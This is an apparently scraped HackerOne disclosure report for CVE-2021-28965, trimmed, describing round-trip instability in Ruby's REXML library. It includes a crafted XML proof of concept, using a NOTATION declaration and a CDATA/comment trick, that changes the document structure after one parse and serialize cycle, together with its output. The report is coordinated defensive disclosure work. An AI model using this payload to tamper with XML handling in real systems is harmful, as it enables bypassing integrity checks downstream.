# [M] Round-trip instability in REXML

## Summary
Severity: Medium
Program: Ruby
Weakness: N/A
Reporter: jupenur
State: resolved
Disclosed: 2021-04-15T09:44:48.486Z
CVE: CVE-2021-28965
Source: https://hackerone.com/reports/1104077

## Details
**Submitted previously via email to security@ruby-lang.org due to REXML not being listed under in-scope assets here. Explicitly requested by @hsbt to re-submit through HackerOne.**

**CVSS rating calculated based on confirmed downstream impact.**

---

Hi Ruby Security Team,

I'm reaching out to you to report a vulnerability in REXML that renders downstream use-cases susceptible to varying degrees of tampering.

Conceptually the vulnerability is similar to Go encoding/xml bugs publicly disclosed in December. For context, high-level descriptions of those vulnerabilities can be found in the blog post at https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/ and in the advisories it references.

In the case of REXML, the specific vulnerability is best explained using a code example:

```Ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```

This program prints two lines of text:

```
First child in original doc: Y
First child after round-trip: Z
```

The output demonstrates how the structure of an XML document can change when parsed and serialized using REXML. The expected output from a well-behaving parser would be such where both lines end with "Y".


_Trimmed to 38 lines — full report: https://hackerone.com/reports/1104077_
